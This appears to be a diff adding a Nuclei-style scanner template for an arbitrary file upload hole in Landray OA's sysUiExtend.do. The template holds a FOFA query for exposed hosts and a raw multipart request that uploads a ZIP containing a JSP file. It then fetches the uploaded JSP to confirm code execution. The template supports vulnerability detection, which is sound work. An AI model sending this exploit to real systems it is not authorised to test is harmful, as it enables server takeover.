@@ -1,0 +1,35 @@
+id: landray-oa-sysuiextend-fileupload
+
+info:
+  name: 蓝凌OA sysUiExtend.do 任意文件上传漏洞
+  author: yanxiayue
+  tags: 2024,LandrayOA,fileupload
+  severity: high
+  metadata:
+    fofa-query: app="Landray-OA 系统"
+
+http:
+
+  - raw:
+      - |
+        POST /api///sys/ui/sys_ui_extend/sysUiExtend.do?method=getThemeInfo HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: multipart/form-data; boundary=---------------------------260140030128010173621878123124
+
+        -----------------------------260140030128010173621878123124
+        Content-Disposition: form-data; name="file"; filename="test.zip"
+        Content-Type: application/x-zip-compressed
+
+        {{unquote("PK\x03\x04\x0a\x00\x00\x00\x00\x00\x10\x189X\xb7G\x01!#\x00\x00\x00#\x00\x00\x00\x07\x00\x00\x00rce.jsp<% out.println\x28\"Hello, World!\"\x29; %>PK\x03\x04\x14\x00\x00\x00\x08\x005\x179Xg\x1cw\xb9\x17\x00\x00\x00\x1e\x00\x00\x00\x06\x00\x00\x00ui.ini\xcbL\xb1-I-.\xe1\xe5\xcaK\xccM\x852K2Js\x93\xc0l\x00PK\x01\x02\x1f\x00\x0a\x00\x00\x00\x00\x00\x10\x189X\xb7G\x01!#\x00\x00\x00#\x00\x00\x00\x07\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00rce.jsp\x0a\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\\\xd4\xb9\x9b\xf7N\xda\x016\xce\x17\x9c\xf7N\xda\x01\x82\xae\xc4\x98\xf7N\xda\x01PK\x01\x02\x1f\x00\x14\x00\x00\x00\x08\x005\x179Xg\x1cw\xb9\x17\x00\x00\x00\x1e\x00\x00\x00\x06\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00H\x00\x00\x00ui.ini\x0a\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\xce\xa7\x126\xf7N\xda\x01\xce\xa7\x126\xf7N\xda\x01\x8c\xf4\x14\x1e\xf7N\xda\x01PK\x05\x06\x00\x00\x00\x00\x02\x00\x02\x00\xb1\x00\x00\x00\x83\x00\x00\x00\x00\x00")}}
+        -----------------------------260140030128010173621878123124--
+  - raw:
+      - |
+        GET /resource/ui-ext/test/rce.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code==200 && contains(body,'Hello, World!')"
